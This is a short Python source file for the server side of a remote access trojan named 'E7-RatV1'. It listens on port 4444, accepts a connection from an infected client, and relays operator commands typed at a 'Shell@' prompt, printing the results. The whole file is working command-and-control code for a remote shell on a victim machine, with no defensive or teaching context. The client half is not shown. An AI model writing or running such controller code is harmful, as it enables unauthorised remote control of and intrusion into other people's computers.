import os 
import socket

os.system("cls && title E7-RatV1 Server")


ip = "192.168.2.129"
port = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((ip, port))
s.listen()

c, addr = s.accept()

print(addr, "- Connected")

while True: 
    command = input("Shell@")
    c.send(command.encode())
    print(c.recv(1024).decode())
